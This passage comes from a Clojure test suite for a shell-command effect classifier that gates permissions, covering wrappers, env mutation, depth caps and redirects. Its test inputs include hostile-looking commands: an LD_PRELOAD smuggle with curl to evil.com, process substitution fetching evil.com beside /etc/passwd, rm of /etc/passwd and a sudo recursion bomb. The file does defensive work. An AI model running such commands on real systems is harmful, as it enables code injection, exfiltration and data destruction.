    (is (not (contains? p [:fs-read "-"]))
        "`-` must not produce a literal `-` path effect")))

(deftest rm-dash-is-stdin-not-delete
  ;; `rm -` doesn't actually unlink the file `-`; it's ambiguous in
  ;; practice (most rms refuse). Conservative: emit stdin-consume,
  ;; do NOT emit fs-delete with scope "-".
  (let [p (pairs-of "rm -")]
    (is (not (contains? p [:fs-delete "-"]))
        "literal `-` must not be classified as fs-delete on `-`")))

;; ===========================================================================
;; DEPTH CAP (T13 — recursion-bomb DoS)
;; ===========================================================================

(deftest depth-bomb-emits-opaque-at-cap
  ;; 100-deep sudo chain with cap 32 — classifies in bounded time,
  ;; produces :opaque at the cap boundary, does not OOM.
  (let [deep-cmd (apply str (concat (repeat 100 "sudo ") ["rm /tmp/x"]))
        ctx     {:registry eff/default-registry :wrap-depth-cap 32}
        effects (cls/classify-tree ctx (ss/parse deep-cmd))
        classes (set (map :class effects))]
    (is (contains? classes :opaque)
        "depth-cap injection should produce an :opaque effect")
    (is (some #(= "wrap-depth-cap" (:scope %)) effects)
        "the :opaque scope marks it as a depth-cap truncation")
    ;; Outermost wrapper is reached via classify-command (not via
    ;; classify-invocation, which bumps :wrap-depth), so the cap=32
    ;; permits the outermost + 32 invocation-level descents = 33
    ;; :privilege-elevate emissions max.
    (is (>= 33 (count (filter #(= :privilege-elevate (:class %)) effects))))))

(deftest depth-bomb-does-not-overflow
  ;; 500-deep sudo chain — must classify (returning :opaque at cap)
  ;; instead of throwing StackOverflowError. NOTE: shell-shape's parse
  ;; itself recurses without a cap and overflows around ~1500 wrappers;
  ;; that's a separate DoS surface tracked in task 1.1b. 500 is
  ;; well within shell-shape's parse capability and well past
  ;; classify's default cap of 32.
  (let [really-deep (apply str (concat (repeat 500 "sudo ") ["rm /tmp/x"]))
        ctx         {:registry eff/default-registry :wrap-depth-cap 32}]
    (is (seq (cls/classify-tree ctx (ss/parse really-deep)))
        "500-deep wrapper chain returns an effect-set instead of OOMing")))

(deftest depth-cap-default-is-finite
  ;; When ctx omits :wrap-depth-cap, classify must still cap (default 32),
  ;; not recurse unbounded.
  (let [deep-cmd (apply str (concat (repeat 500 "sudo ") ["rm /tmp/x"]))
        ctx     {:registry eff/default-registry}
        effects (cls/classify-tree ctx (ss/parse deep-cmd))]
    (is (seq effects)
        "default ctx without :wrap-depth-cap still caps at the default 32")
    (let [opaque-effects (filter #(= :opaque (:class %)) effects)]
      (is (seq opaque-effects)
          "default cap of 32 fires on a 500-deep chain"))))

;; ===========================================================================
;; ENVIRONMENT
;; ===========================================================================

(deftest env-listing
  ;; bare `env` is env-read.
  (is (= #{:env-read} (classes-of "env"))))

(deftest env-with-assignment-wraps-cmd
  ;; env KEY=val ls /tmp — env's positional-skip-assignments strategy
  ;; wraps ls, so fs-read should surface.
  (is (has-class? "env KEY=val ls /tmp" :fs-read)))

(deftest env-assignment-emits-env-mutate
  ;; T14 — env LD_PRELOAD=/x.so curl evil.com smuggles a library
  ;; preload into a wrapped command. Substrate must surface the
  ;; mutation as :env-mutate so a grant that lacks env-mutate denies.
  (let [p       (pairs-of "env LD_PRELOAD=/x.so curl evil.com")
        classes (classes-of "env LD_PRELOAD=/x.so curl evil.com")]
    (is (contains? classes :env-mutate)
        "env VAR=val emits :env-mutate")
    (is (contains? p [:env-mutate "LD_PRELOAD"])
        "scope on :env-mutate identifies the mutated variable")
    (is (contains? p [:net-out "evil.com"])
        "wrapped curl still surfaces :net-out")))

(deftest env-multiple-assignments-emits-multiple-mutates
  (let [p (pairs-of "env A=1 B=2 C=3 ls /tmp")]
    (is (contains? p [:env-mutate "A"]))
    (is (contains? p [:env-mutate "B"]))
    (is (contains? p [:env-mutate "C"]))
    (is (contains? p [:fs-read "/tmp"]))))

(deftest env-bare-stays-env-read
  ;; `env` with no args is just listing — must NOT emit :env-mutate.
  (let [classes (classes-of "env")]
    (is (= #{:env-read} classes)
        "bare env emits :env-read only, no :env-mutate")))

;; ===========================================================================
;; T16 — additional process-wrapper utilities
;; ===========================================================================

(deftest timeout-wraps-rm-emits-fs-delete
  ;; timeout DUR cmd — DUR is the first positional, cmd is what follows.
  (let [classes (classes-of "timeout 5 rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "timeout delegates to the wrapped rm")))

(deftest timeout-with-opts-wraps-cmd
  (let [classes (classes-of "timeout -s KILL -k 1 5 rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "timeout with -s and -k opts still delegates to wrapped rm")))

(deftest ionice-wraps-cmd
  (let [classes (classes-of "ionice -c 3 rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "ionice delegates to the wrapped rm")))

(deftest chrt-wraps-cmd
  ;; chrt PRIO cmd — first positional is priority, then the command.
  (let [classes (classes-of "chrt -f 50 rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "chrt delegates to wrapped rm after skipping the PRIORITY positional")))

(deftest setsid-wraps-cmd
  (let [classes (classes-of "setsid rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "setsid delegates to wrapped rm")))

(deftest stdbuf-wraps-cmd
  (let [classes (classes-of "stdbuf -i 0 -o 0 rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "stdbuf delegates to wrapped rm")))

(deftest flock-wraps-cmd
  ;; flock FILE cmd — first positional is the lock file, then the command.
  (let [classes (classes-of "flock /tmp/lock rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "flock delegates to wrapped rm after skipping the FILE positional")))

(deftest doas-emits-elevation-plus-wrapped
  (let [p (pairs-of "doas rm /tmp/x")]
    (is (contains? p [:privilege-elevate "root"])
        "doas emits :privilege-elevate like sudo")
    (is (contains? p [:fs-delete "/tmp/x"])
        "doas delegates to wrapped rm")))

(deftest runuser-emits-elevation-plus-wrapped
  (let [p (pairs-of "runuser -u root rm /tmp/x")]
    (is (contains? p [:privilege-elevate "root"])
        "runuser emits :privilege-elevate")
    (is (contains? p [:fs-delete "/tmp/x"])
        "runuser delegates to wrapped rm after -u USER")))

(deftest systemd-run-wraps-cmd
  (let [classes (classes-of "systemd-run rm /tmp/x")]
    (is (contains? classes :fs-delete)
        "systemd-run delegates to wrapped rm")))

;; ===========================================================================
;; T14 — shell builtins
;; ===========================================================================

(deftest cd-emits-env-mutate-pwd
  ;; `cd` mutates PWD/OLDPWD — must surface as :env-mutate not :opaque.
  (let [p (pairs-of "cd /tmp")]
    (is (contains? p [:env-mutate "PWD"])
        "cd emits :env-mutate on PWD")))

(deftest export-emits-env-mutate
  ;; export PATH=/evil:$PATH — variable name is PATH; value has a
  ;; var reference but that doesn't change the assignment-target
  ;; (PATH IS being mutated).
  (let [p (pairs-of "export PATH=/evil:secret")]
    (is (contains? p [:env-mutate "PATH"]))))

(deftest export-multiple-emits-multiple-mutates
  (let [p (pairs-of "export A=1 B=2 C=3")]
    (is (contains? p [:env-mutate "A"]))
    (is (contains? p [:env-mutate "B"]))
    (is (contains? p [:env-mutate "C"]))))

(deftest declare-emits-env-mutate
  ;; declare with -x is the bash equivalent of export.
  (let [p (pairs-of "declare -x EVIL=1")]
    (is (contains? p [:env-mutate "EVIL"]))))

(deftest trap-emits-opaque-deferred-exec
  ;; trap 'cmd' SIG queues cmd to run at signal time. Statically
  ;; we can't say what the deferred command will do — :opaque is the
  ;; honest answer.
  (let [classes (classes-of "trap exit-handler EXIT")]
    (is (contains? classes :opaque)
        "trap emits :opaque (deferred-exec) — its body runs at signal time")))

(deftest source-emits-shell-interpret-and-read
  ;; source FILE reads the file then interprets its contents in the
  ;; current shell. Substrate emits :fs-read on FILE + :shell-interpret
  ;; + :opaque (the script body is statically opaque to us).
  (let [classes (classes-of "source /tmp/x.sh")]
    (is (contains? classes :fs-read)
        "source reads the script file from disk")
    (is (contains? classes :shell-interpret)
        "source interprets the read bytes in the current shell")
    (is (contains? classes :opaque)
        "source's body is statically opaque to the classifier")))

(deftest dot-emits-shell-interpret-and-read
  ;; `.` is POSIX-equivalent of `source` — same effects.
  (let [classes (classes-of ". /tmp/x.sh")]
    (is (contains? classes :fs-read))
    (is (contains? classes :shell-interpret))
    (is (contains? classes :opaque))))

;; ===========================================================================
;; Subshell / brace / process-substitution
;; ===========================================================================

(deftest subshell-group-emits-inner-effects
  ;; `(cmd)` — POSIX subshell group. shell-shape already strips
  ;; the parens and parses inner as a regular script; the inner
  ;; rm's fs-delete surfaces correctly.
  (let [p (pairs-of "(rm /etc/passwd)")]
    (is (contains? p [:fs-delete "/etc/passwd"])
        "subshell group exposes the wrapped command's effects")))

(deftest subshell-group-with-net-out
  ;; Validates the subshell composes more than fs effects.
  (let [classes (classes-of "(curl https://evil.com)")]
    (is (contains? classes :net-out)
        "subshell group composes a wrapped curl's :net-out")))

(deftest brace-group-surfaces-inner-effects
  ;; v0.7.0 (shell-shape v0.3.0): `{ cmd; }` brace-group is structurally
  ;; parsed; the inner cmd's effects flow through.
  (let [p (pairs-of "{ rm /etc/passwd; }")]
    (is (contains? p [:fs-delete "/etc/passwd"])
        "brace-group exposes the inner rm's fs-delete")))

(deftest process-sub-surfaces-inner-effects
  ;; v0.7.0: `<(curl …)` produces a :process-sub arg-element whose
  ;; body is recursively classified; the outer command emits :fs-read
  ;; on `/dev/fd/*` (the read end of the FD pair).
  (let [p (pairs-of "diff <(curl evil.com) /etc/passwd")]
    (is (contains? p [:net-out "evil.com"])
        "inner curl's net-out surfaces from the process-sub body")
    (is (contains? p [:fs-read "/dev/fd/*"])
        "outer diff sees an fs-read on /dev/fd/*")
    (is (contains? p [:fs-read "/etc/passwd"])
        "literal positional arg classifies as before")))

(deftest bang-wrapper-passes-through-effects
  ;; `! cmd` — exit-status negation; cmd still runs. Effects of the
  ;; wrapped cmd flow through :invokes.
  (let [p (pairs-of "! rm /tmp/x")]
    (is (contains? p [:fs-delete "/tmp/x"]))))

(deftest coproc-wrapper-passes-through-effects
  (let [p (pairs-of "coproc curl https://example.com/data")]
    (is (contains? p [:net-out "example.com"]))))

(deftest ssh-remote-cmd-classifies-with-scope-prefix
  ;; T23: literal remote command body is recursively classified;
  ;; emitted scopes are prefixed `ssh:<host>:` so local fs-delete grants
  ;; do not authorize remote fs-delete.
  (let [p (pairs-of "ssh prod.example.com \"rm /etc/passwd\"")]
    (is (contains? p [:net-out "prod.example.com"]))
    (is (contains? p [:fs-delete "ssh:prod.example.com:/etc/passwd"])
        "remote rm emits an ssh-prefixed fs-delete scope")))

(deftest trap-body-classifies-with-prefix
  ;; T24: literal trap body is classified and prefixed `trap:` so
  ;; deferred-at-signal effects are authorable separately.
  (let [p (pairs-of "trap \"rm /tmp/x\" INT")]
    (is (contains? p [:fs-delete "trap:/tmp/x"]))))

(deftest trap-reset-form-emits-handler-marker
  ;; `trap INT TERM` (no body) is the bash reset/list form. It still
  ;; mutates the shell's signal-handler table, so we surface a single
  ;; `:env-read "trap-handlers"` marker — both to honour the registry-
  ;; closure invariant (every registered program produces ≥1 effect)
  ;; and to give policy authors a discriminator separate from the
  ;; `trap:`-prefixed body form.
  (let [p (pairs-of "trap INT TERM")]
    (is (contains? p [:env-read "trap-handlers"]))))

(deftest mail-recipient-classifies-as-net-out
  ;; T25: literal recipient becomes :net-out scope=address.
  (let [p (pairs-of "mail user@example.com -s subject")]
    (is (contains? p [:net-out "user@example.com"]))))

;; ===========================================================================
;; DEDUPLICATION via effect-set
;; ===========================================================================

(deftest effect-set-collapses-duplicates
  ;; Same (class, scope) pair appearing twice collapses to one entry.
  (let [effects [{:class :fs-read :scope "/tmp" :provenance {:rule :a}}
                 {:class :fs-read :scope "/tmp" :provenance {:rule :b}}
                 {:class :fs-write :scope "/x" :provenance {:rule :c}}]]
    (is (= #{[:fs-read "/tmp"] [:fs-write "/x"]}
           (cls/effect-set effects)))))

(deftest has-opaque-positive
  (let [effects [{:class :fs-read :scope "/tmp" :provenance {}}
                 {:class :opaque  :scope "?"    :provenance {}}]]
    (is (cls/has-opaque? effects))))

(deftest has-opaque-negative
  (let [effects [{:class :fs-read :scope "/tmp" :provenance {}}]]
    (is (not (cls/has-opaque? effects)))))

;; ===========================================================================
;; KNOWN-CLASS PREDICATE
;; ===========================================================================

(deftest known-class-keyword
  (is (eff/known-class? :fs-read))
  (is (eff/known-class? :opaque))
  (is (not (eff/known-class? :made-up-class))))

(deftest known-class-string
  (is (eff/known-class? "fs-read"))
  (is (not (eff/known-class? "bogus"))))

;; ===========================================================================
;; PROVENANCE
;; ===========================================================================

(deftest provenance-includes-program-and-rule
  (let [es (effects-of "ls /tmp")]
    (is (every? #(string? (-> % :provenance :program)) es))
    (is (every? #(keyword? (-> % :provenance :rule)) es))))

;; ===========================================================================
;; WRAPPER PASS-THROUGH (mutation-pinned)
;; ===========================================================================
;;
;; These tests pin every transparent-wrapper entry in the registry —
;; the ones whose own-effects are nil and which exist solely to
;; propagate the wrapped command's effects via :invokes descent. The
;; mutation harness's :relax-classifier operator (which replaces
;; classify with `(constantly [])`) would otherwise survive against
;; these entries because no other test exercises the wrapper-rm path.

(deftest exec-propagates-wrapped-effects
  (is (has-class? "exec rm /tmp/x" :fs-delete)
      "exec must propagate the wrapped command's effects")
  (is (not (has-class? "exec rm /tmp/x" :opaque))
      "exec is a transparent wrapper — no :opaque (mutation :drop-entry would add one)"))

(deftest nice-propagates-wrapped-effects
  (is (has-class? "nice rm /tmp/x" :fs-delete))
  (is (not (has-class? "nice rm /tmp/x" :opaque))
      "nice is transparent — :opaque appears only when entry is dropped"))

(deftest nohup-propagates-wrapped-effects
  (is (has-class? "nohup rm /tmp/x" :fs-delete))
  (is (not (has-class? "nohup rm /tmp/x" :opaque))
      "nohup is transparent — :opaque appears only when entry is dropped"))

(deftest command-propagates-wrapped-effects
  (is (has-class? "command rm /tmp/x" :fs-delete)
      "command must propagate the wrapped command's effects")
  (is (not (has-class? "command rm /tmp/x" :opaque))
      "command is transparent — :opaque appears only when entry is dropped"))

(deftest timeout-propagates-wrapped-effects
  (is (has-class? "timeout 5 rm /tmp/x" :fs-delete)
      "timeout must propagate the wrapped command's effects")
  (is (not (has-class? "timeout 5 rm /tmp/x" :opaque))
      "timeout is transparent — :opaque appears only when entry is dropped"))

(deftest time-propagates-wrapped-effects
  (is (has-class? "time rm /tmp/x" :fs-delete)
      "time must propagate the wrapped command's effects")
  (is (not (has-class? "time rm /tmp/x" :opaque))
      "time is transparent — :opaque appears only when entry is dropped"))

(deftest setsid-propagates-wrapped-effects
  (is (has-class? "setsid rm /tmp/x" :fs-delete)
      "setsid must propagate the wrapped command's effects")
  (is (not (has-class? "setsid rm /tmp/x" :opaque))
      "setsid is transparent — :opaque appears only when entry is dropped"))

(deftest netcat-with-target-emits-net-out
  ;; netcat with an explicit host:port must emit :net-out — relaxing
  ;; its classifier would lose this pin.
  (is (has-class? "netcat example.com 443" :net-out)))

;; ===========================================================================
;; SCOPE PINNING (mutation-pinned)
;; ===========================================================================
;;
;; The :swap-scope-glob mutation appends `**` to every emitted scope.
;; These tests pin the exact narrow scope so the widening is observable.

(deftest mkdir-scope-is-narrow-not-glob
  (is (has-pair? "mkdir /tmp/new" :fs-write "/tmp/new")
      "mkdir scope must be the exact path — not /tmp/new**"))

(deftest tree-scope-is-narrow-not-glob
  (is (has-pair? "tree /etc" :fs-read "/etc")
      "tree scope must be the exact path — not /etc**"))

;; ===========================================================================
;; PURE-FILTER EFFECT PINNING (mutation-pinned)
;; ===========================================================================
;;
;; The :drop-entry mutation removes an entry from the registry, so the
;; program falls through to :opaque. For pure data-filter programs
;; (sort, comm, join, etc.) we still want a positive effect-class pin
;; so the registry presence is observable.

(deftest sort-emits-fs-read
  (is (has-class? "sort /tmp/data" :fs-read)
      "sort must classify file args as fs-read"))

(deftest comm-emits-fs-read
  (is (has-pair? "comm /tmp/a /tmp/b" :fs-read "/tmp/a")
      "comm scope must be exact path arg — not /tmp/a** (mutation :swap-scope-glob)")
  (is (has-pair? "comm /tmp/a /tmp/b" :fs-read "/tmp/b")))

;; ===========================================================================
;; v0.7.0 — additional scope-glob pins exposed by mutation seed sampling
;; ===========================================================================
;;
;; Expanding the registry (`!`, `coproc`, `mail`, `mailx`, `sendmail`) shifted
;; the mutation harness's sorted-index selection so iterations now sample
;; programs that v0.6.0's seeds happened not to. Tight scope pins for the
;; recurring survivors.

(deftest stat-scope-is-narrow-not-glob
  (is (has-pair? "stat /tmp/x" :fs-read "/tmp/x")
      "stat scope must be the exact path — not /tmp/x**"))

(deftest find-scope-is-narrow-not-glob
  (is (has-pair? "find /tmp" :fs-read "/tmp")
      "find scope must be the exact path — not /tmp**"))

(deftest node-interp-scope-is-narrow-not-glob
  (is (has-pair? "node script.js" :interp-interpret "node")
      "node interp-interpret scope must be exactly \"node\" — not node**"))

(deftest scp-scopes-are-narrow-not-glob
  ;; scp's existing classifier composes `classify-net-out` + `classify-fs-read-write`
  ;; without parsing `user@host:path` syntax, so the net-out scope is the first
  ;; positional path and the second `user@host:/dst` becomes the fs-write scope.
  ;; Pinning the literal observed shape so :swap-scope-glob's `**` suffix is
  ;; caught. Tightening the classifier to split user@host:path is deferred.
  (let [p (pairs-of "scp /tmp/src user@host.com:/dst")]
    (is (contains? p [:net-out "/tmp/src"])
        "scp net-out scope must be the exact first arg — not /tmp/src**")
    (is (contains? p [:fs-read "/tmp/src"])
        "scp fs-read scope must be exact path — not /tmp/src**")
    (is (contains? p [:fs-write "user@host.com:/dst"])
        "scp fs-write scope must be exact path — not user@host.com:/dst**")))

(deftest dot-shell-interpret-narrow-not-glob
  (is (has-pair? ". /tmp/x.sh" :shell-interpret "posix")
      ". shell-interpret scope must be exactly \"posix\" — not posix**"))

(deftest systemd-run-transparent-wrapper-no-opaque
  ;; systemd-run is a transparent wrapper. Dropping it from the registry
  ;; would emit :opaque "unclassified-program:systemd-run" alongside the
  ;; wrapped command's effects.
  (is (has-class? "systemd-run rm /tmp/x" :fs-delete)
      "systemd-run must propagate the wrapped command's effects")
  (is (not (has-class? "systemd-run rm /tmp/x" :opaque))
      "systemd-run is a transparent wrapper — no :opaque (mutation :drop-entry would add one)"))

(deftest xargs-opaque-scope-is-not-unclassified-program
  ;; xargs already pins `:opaque` (xargs-delegates-opaque), but with a
  ;; loose `has-class?`. Tighten so :drop-entry @ xargs is caught:
  ;; dropping the entry makes the literal "xargs" surface as
  ;; :opaque "unclassified-program:xargs" — a scope that should NEVER
  ;; appear when the entry is present.
  (is (not (has-pair? "xargs rm" :opaque "unclassified-program:xargs"))
      "xargs's :opaque scope must NOT be the dropped-entry fallback"))

(deftest join-emits-fs-read
  (is (has-pair? "join /tmp/a /tmp/b" :fs-read "/tmp/a")
      "join scope must be exact path arg — not /tmp/a**")
  (is (has-pair? "join /tmp/a /tmp/b" :fs-read "/tmp/b"))
  (is (not (has-class? "join /tmp/a /tmp/b" :fs-write))
      "join must NOT emit fs-write (mutation :swap-class would flip this)"))

;; ===========================================================================
;; v0.24.0 — fd-dup redirects, stdin-consume override, witness self-classifier
;; ===========================================================================

(deftest fd-dup-redirect-emits-no-effect
  ;; `2>&1` is a kernel fd-relabel — no new I/O sink, no new fs-read.
  ;; Pre-v0.24.0 this fired opaque:redirect-variable-target on every
  ;; `cmd 2>&1` form under auto-mode-aggressive.
  (is (not (has-pair? "ls /tmp 2>&1" :opaque "redirect-variable-target"))
      "fd-duplicate must NOT emit opaque:redirect-variable-target")
  (is (not (has-class? "ls /tmp 2>&1" :fs-write))
      "fd-duplicate must NOT emit fs-write")
  (is (has-pair? "ls /tmp 2>&1" :fs-read "/tmp")
      "the underlying ls's fs-read is still classified normally"))

(deftest fd-dup-close-and-stdin-dup-also-no-effect
  (is (not (has-class? "ls 2>&-" :opaque))
      "`2>&-` (close fd 2) is a no-effect redirect")
  (is (not (has-class? "cat <&0" :opaque))
      "`<&0` (read from stdin fd) is a no-effect redirect"))

(deftest stream-processor-bare-form-is-stdin-consume
  ;; v0.24.0 — under auto-mode-aggressive, `cmd | tail -30` was
  ;; spuriously emitting fs-read:. on the tail stage because the
  ;; default fs-read classifier defaulted to "." on missing paths.
  ;; The new stdin-consume override fires correctly:
  (is (has-class? "tail -30" :stdin-consume))
  (is (not (has-pair? "tail -30" :fs-read "."))
      "bare `tail -30` must NOT spuriously emit fs-read:.")
  (is (has-class? "head -5"  :stdin-consume))
  (is (has-class? "wc -l"    :stdin-consume))
  (is (has-class? "sort"     :stdin-consume))
  (is (has-class? "uniq"     :stdin-consume)))

(deftest script-then-files-bare-form-is-stdin-consume
  ;; v0.24.0 — `classify-script-then-files` handles programs whose
  ;; FIRST positional is a SCRIPT, not a path. Bare form (no files
  ;; after the script) reads stdin.
  (is (has-class? "jq ."          :stdin-consume))
  (is (has-class? "awk '{print}'" :stdin-consume))
  (is (has-class? "sed -e 1d"     :stdin-consume))
  (is (has-class? "sed 's/a/b/'"  :stdin-consume))
  ;; And — critically — the script positional must NOT be misread as
  ;; an fs-read scope.
  (is (not (has-pair? "jq ."         :fs-read "."))
      "jq's `.` filter must NOT be classified as fs-read on \".\"")
  (is (not (has-pair? "awk '{print}'" :fs-read "{print}"))
      "awk's program body must NOT be classified as fs-read")
  (is (not (has-pair? "sed 's/a/b/' " :fs-read "s/a/b/"))
      "sed's expression must NOT be classified as fs-read"))

(deftest script-then-files-with-positional-file
  (is (has-pair? "jq . input.json"          :fs-read "input.json"))
  (is (has-pair? "awk '{print}' data.txt"   :fs-read "data.txt"))
  (is (has-pair? "sed 's/a/b/' file.txt"    :fs-read "file.txt"))
  (testing "script positional dropped — files are positionals[1:]"
    (is (not (has-pair? "jq . input.json" :fs-read ".")))
    (is (not (has-pair? "awk '{print}' a b" :fs-read "{print}"))
        "first positional `{print}` is the awk program, not a file")
    (is (has-pair? "awk '{print}' a b" :fs-read "a"))
    (is (has-pair? "awk '{print}' a b" :fs-read "b"))))

(deftest script-then-files-script-via-flag
  ;; `awk -f prog.awk file.txt` — `-f` supplies the script; ALL
  ;; positionals are files. The script file ITSELF is an fs-read.
  (let [p (pairs-of "awk -f prog.awk file.txt")]
    (is (contains? p [:fs-read "prog.awk"]) "script-file is read")
    (is (contains? p [:fs-read "file.txt"]) "data file is read")
    (is (not (contains? p [:fs-read "-f"])) "the flag itself is not a path"))
  (let [p (pairs-of "sed -e 's/a/b/' file.txt")]
    (is (contains? p [:fs-read "file.txt"]))
    (is (not (some (fn [[c s]] (and (= c :fs-read) (= s "s/a/b/"))) p))
        "sed -e expr means NO positional is consumed as script"))
  (let [p (pairs-of "jq -f filter.jq input.json")]
    (is (contains? p [:fs-read "filter.jq"]))
    (is (contains? p [:fs-read "input.json"]))))

(deftest sed-in-place-emits-fs-write
  ;; `sed -i 's/a/b/' file.txt` — in-place edit; file becomes fs-write.
  (let [p (pairs-of "sed -i 's/a/b/' file.txt")]
    (is (contains? p [:fs-write "file.txt"])
        "sed -i is a destructive in-place edit")
    (is (not (contains? p [:fs-read "file.txt"]))
        "in-place flips the class; no double-count as fs-read")))

(deftest jq-value-flags-do-not-leak-as-positional
  ;; `jq --arg name value .` — `--arg` consumes its inline value;
  ;; `.` is still the filter. With no positional file → stdin-consume.
  (let [p (pairs-of "jq --arg name value .")]
    (is (some (fn [[c _]] (= c :stdin-consume)) p)
        "no file → stdin-consume")
    (is (not (contains? p [:fs-read "value"]))
        "value of --arg must NOT be misread as a path")
    (is (not (contains? p [:fs-read "name"]))
        "name of --arg must NOT be misread as a path")
    (is (not (contains? p [:fs-read "."]))
        "the jq filter `.` must NOT be misread as a path")))

(deftest stream-processor-with-positional-still-fs-read
  ;; The override only kicks in when there are NO positional paths.
  ;; With positional paths, behavior matches the original classify-fs-read.
  (is (has-pair? "tail /tmp/x"          :fs-read "/tmp/x"))
  (is (has-pair? "head -n 5 /tmp/x"     :fs-read "/tmp/x"))
  (is (has-pair? "wc /tmp/x"            :fs-read "/tmp/x"))
  (is (has-pair? "cat /etc/passwd"      :fs-read "/etc/passwd")))

(deftest listing-commands-keep-bare-fs-read-on-cwd
  ;; ls/stat/file/tree/grep/diff/join: bare form DOES read cwd or
  ;; similar — keep `fs-read:.`.
  (is (has-pair? "ls"     :fs-read "."))
  (is (has-pair? "stat"   :fs-read "."))
  (is (has-pair? "tree"   :fs-read ".")))

